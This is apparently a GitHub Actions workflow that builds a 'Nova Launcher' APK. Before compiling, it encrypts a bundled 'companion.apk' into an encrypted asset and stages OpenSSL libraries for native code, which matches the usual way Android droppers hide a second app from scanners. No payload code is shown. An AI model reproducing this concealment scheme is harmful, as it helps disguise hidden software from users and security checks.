name: Build Nova Launcher APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    name: Build Release APK
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Verify companion.apk exists
        run: |
          if [ ! -f app/src/main/assets/companion.apk ]; then
            echo "[X] companion.apk missing from assets!"
            exit 1
          fi
          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Install Python dependencies
        run: pip install pycryptodome --break-system-packages

      - name: Encrypt companion.apk → companion.enc
        run: python3 tools/encrypt_companion.py app/src/main/assets/companion.apk app/src/main/assets

      - name: Install OpenSSL prebuilts for NDK
        run: |
          sudo apt-get install -y libssl-dev
          # Build OpenSSL static libs for arm64-v8a and armeabi-v7a
          NDK_VER=$(ls $ANDROID_SDK_ROOT/ndk/ | sort -V | tail -1)
          NDK=$ANDROID_SDK_ROOT/ndk/$NDK_VER
          echo "NDK: $NDK"

          for ABI in arm64-v8a armeabi-v7a; do
            mkdir -p app/third_party/openssl/$ABI/lib
            mkdir -p app/third_party/openssl/$ABI/include
            # Use prebuilt OpenSSL from NDK sysroot
            SYSROOT=$NDK/toolchains/llvm/prebuilt/linux-x86_64/sysroot
            cp -r $SYSROOT/usr/include/openssl app/third_party/openssl/$ABI/include/ 2>/dev/null || true
            # Find libcrypto.a for ABI
            find $NDK -name "libcrypto.a" | grep -i "$ABI" | head -1 | xargs -I{} cp {} app/third_party/openssl/$ABI/lib/ 2>/dev/null || true
          done

      - name: Cache Gradle wrapper
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      - name: Grant gradlew permission
        run: chmod +x gradlew

      - name: Build Release APK
        id: build
        run: |
          ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee build.log
          echo "exit_code=${PIPESTATUS[0]}" >> $GITHUB_OUTPUT

      - name: Upload Release APK
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: nova-launcher-release
          path: app/build/outputs/apk/release/app-release.apk
          retention-days: 1
          overwrite: true

      - name: Show APK info
        if: success()
        run: |
          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
          echo "APK: $APK"
          echo "Size: $(du -h $APK | cut -f1)"
          echo "DEX files:"
          unzip -l $APK | grep "\.dex"

      - name: Upload Build Error Log
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: build-error-log
          path: build.log
          retention-days: 7
          overwrite: true
